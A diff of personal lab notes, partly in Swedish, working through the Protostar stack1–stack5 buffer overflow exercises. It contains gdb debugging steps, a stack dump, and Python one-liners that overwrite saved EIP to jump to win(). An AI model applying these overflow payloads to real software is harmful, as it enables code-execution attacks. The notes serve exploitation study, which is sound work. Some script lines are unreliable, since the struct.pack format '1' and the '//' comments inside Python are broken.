@@ -19,6 +19,7 @@ EDI: Destination Index points to the location where the result of data operation
 EIP: Instruction Pointer
 
 GDB: https://sourceware.org/gdb/onlinedocs/gdb/Invoking-GDB.html
+     https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection
 
 // Till standard input 
 echo $(python -c "print('A'*300)") | ./stack4
@@ -26,25 +27,66 @@ echo $(python -c "print('A'*300)") | ./stack4
 // Som argument 
 echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1
 
-**** stack1 ****
+// Multiplexer 
+./stack4 &  -> start process
+gdb -p 1704 -> attach to running process
+tmux    -> terminal multiplexer
+
+// HOOK STOP (Printar saker vid varje break)
+define hook-stop
+>info registers     -> print registers
+>x/24wx $esp        -> print stack
+>x/2i $eip          -> next 2 instructions
+>end
+
+
+**** Stack 1 ****
 echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1
 
-**** stack2 ****
+**** Stack 2 ****
 export GREENIE=$(python -c "print('A'*64 + '\n\r\n\r')")
 
-**** stack3 ****
+**** Stack 3 ****
 gdb ./stack3            (objdump -d ./stack3)
 disassemble main
 disassemble win
 win() startaddr: 0x08048424 
 echo $(python -c "print('A'*64 + '$' + chr(132) + chr(4) + chr(8))") | ./stack3
 
-**** stack4 ****
+**** Stack 4 ****
+chsh -s /bin/bash      -> Ändra shell till bash så gdb kör med det
+bash
+logout                   -> Måste logga ut för att env har SHELL som bash
 objdump -d ./stack4     -> Adress för win = 080483f4
-tmux    -> terminal multiplexer
 gdb ./stack4
 break main
-info registers -> check eip
+r < <(python -c 'print("A"*64)')
+info frame          -> Ger: saved eip 0xb7eadc76 
+// Printa stacken för att se vart saved eip är, och skriv över den med adressen till win
+x/24wx $esp    -> print stack
+0xbffff770:     0xbffff780      0xb7ec6165      0xbffff788      0xb7eada75
+0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff790:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7c0:     0x08048400      0x00000000      0xbffff848      0xb7eadc76 <---------- Saved eip
+// Saved eip, sparad instruktion till call main, skriv över den med adressen till win
+// Offset borde alltså vara: 64 + (4*3)
+// Adress för win = 080483f4, vilket är 4 bytes i decimalform: 244 131 4 8
+// Alltså lär det funka med: (python -c 'print("A"* (64 + (4*3)) + chr(244) + chr(131) + chr(4) + chr(8))')
+echo $(python -c 'print("A"* (64 + (4*3)) + chr(244) + chr(131) + chr(4) + chr(8))') | ./stack4
+// ebp ligger 4 bytes före eip så man kan också mata in tecken för att se vart man skriver över 
+// ebp, för att veta offset till eip. Sen kan du skriva script:
+padding = "A" * (64 + 4*2)
+ebp = "AAAA"
+eip = struct.pack("1", 0x080483f4)
+payload = padding + ebp + eip
+print(payload)
 
-./stack4 &  -> start process
-gdb -p 1704 -> attach to running process
+**** Stack 5 ****
+#/bin/python 
+padding = "A" * (64 + 4*2) //payload här sen peka eip på detta? Vi kan ju kolla vilken adress det kommer hamna på
+ebp = "AAAA"
+eip = struct.pack("1", 0x080483f4)
+payload = padding + ebp + eip
+print(payload)
